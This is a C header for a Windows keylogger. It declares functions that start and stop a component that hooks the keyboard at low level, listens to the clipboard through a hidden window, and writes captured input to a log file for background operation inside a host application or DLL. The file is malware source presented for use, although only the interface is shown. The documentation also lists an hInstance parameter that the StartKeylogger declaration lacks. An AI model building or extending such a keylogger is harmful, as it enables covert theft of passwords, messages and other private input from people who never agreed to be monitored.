#pragma once

#include <windows.h>

/**
 * @brief Initializes and starts the keylogger and clipboard monitor.
 *
 * This function sets up all necessary components for background operation:
 * - Opens the log file for writing.
 * - Creates a hidden window to receive clipboard update messages.
 * - Registers a listener for clipboard changes.
 * - Sets a low-level keyboard hook to capture keystrokes.
 *
 * It must be called once before the keylogger can begin recording.
 * The host application must be running a message loop for the logger to function.
 *
 * @param hInstance The handle to the instance of the host application.
 *                  Pass NULL if the keylogger is used in a DLL, though passing
 *                  the application's instance is recommended.
 * @return TRUE if initialization was successful, FALSE otherwise.
 */
BOOL StartKeylogger(void);

/**
 * @brief Stops the keylogger and releases all system resources.
 *
 * This function performs a clean shutdown of all logging activities:
 * - Unhooks the keyboard hook.
 * - Unregisters the clipboard listener.
 * - Destroys the hidden message window.
 * - Closes the handle to the log file.
 *
 * It should be called before the host application exits to ensure a clean shutdown.
 *
 * @return TRUE if shutdown was successful, FALSE otherwise.
 */
BOOL StopKeylogger(void);